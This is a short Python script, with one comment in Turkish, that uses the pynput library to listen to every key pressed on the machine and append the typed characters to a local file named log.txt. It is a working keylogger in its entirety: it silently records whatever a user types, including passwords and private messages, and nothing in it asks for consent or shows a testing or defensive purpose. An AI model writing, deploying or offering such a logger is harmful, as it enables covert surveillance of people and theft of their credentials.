from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    global keys
    keys.append(key)
    write_file(keys)


def write_file(keys):
    with open("log.txt", "a", encoding="utf-8") as file:
        for key in keys:
            ky = str(key).replace("'", "")
            if ky.find("space") > 0:
                file.write(" ")
            elif ky.find("Key.") == -1:
                file.write(ky)
        # Dosyaya yazdıktan sonra, keys listesini boşaltın.
        keys.clear()


with Listener(on_press=on_press) as listener:
    listener.join()
